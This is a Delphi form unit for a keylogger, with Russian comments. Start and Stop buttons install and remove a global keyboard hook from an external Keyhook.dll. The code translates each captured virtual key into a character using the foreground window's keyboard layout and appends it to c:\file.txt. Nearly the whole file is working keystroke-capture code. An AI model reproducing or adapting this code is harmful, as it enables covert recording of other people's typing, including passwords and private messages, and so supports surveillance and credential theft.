unit Main;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, IniHook;


const
  WM_ReadWithHook = WM_USER + 120; // Пользовательское сообщение

type
  TPrimary = class(TForm)
    Button_Start: TButton;
    Button_Stop: TButton;
    Memo: TMemo;
    function GetCharFromVKey(vKey: Word): String;
    procedure Button_StartClick(Sender: TObject);
    procedure Button_StopClick(Sender: TObject);
  private
    { Private declarations }
    procedure WM_READHOOK(var Message: TMessage); message WM_ReadWithHook;
  public
    { Public declarations }
  end;

  procedure SetHook; stdcall; external 'Keyhook.dll';
  procedure DelHook; stdcall; external 'Keyhook.dll';

var
  Primary: TPrimary;

implementation

{$R *.dfm}

// Перевод кода клавиш в нужную кодировку
function TPrimary.GetCharFromVKey(vKey: Word): String;
var
  KeyState: TKeyboardState;
  Retcode: Integer;
  Proc: THandle;
begin
  Proc := GetWindowThreadProcessId(GetForegroundWindow, Proc);
  AttachThreadInput(Proc, GetCurrentThreadId, True);
  Win32Check(GetKeyboardState(KeyState));
  SetLength(Result, 2);
  Retcode := ToAsciiEx(vKey, MapVirtualKey(vKey, 0), KeyState, @Result[1], 0, GetKeyboardLayout(Proc));
  case Retcode of
    0: Result := '';
    1: SetLength(Result, 1);
  else
    Result := '';
  end;
end;

// Обработка пользовательского сообщения
procedure TPrimary.WM_READHOOK(var Message: TMessage);
var
 f:TextFile;
 FileDir:String;
begin
 FileDir:='c:\file.txt';
AssignFile(f,FileDir);
if not FileExists(FileDir) then
 begin
  Rewrite(f);
  CloseFile(f);
 end;
Append(f);
Writeln(f,GetCharFromVKey(Message.WParam));
Flush(f);
CloseFile(f);
end;


// Устанавливаем ловушку
procedure TPrimary.Button_StartClick(Sender: TObject);
begin
  // Очищаем разделяемую область
  FillChar(DataArea^, SizeOf(DataArea^), 0);
  // Передаем дескриптор нашего окна
  DataArea^.FormHandle := Handle;
  SetHook;
end;

// Останавливаем ловушку
procedure TPrimary.Button_StopClick(Sender: TObject);
begin
  DelHook;
end;

end.





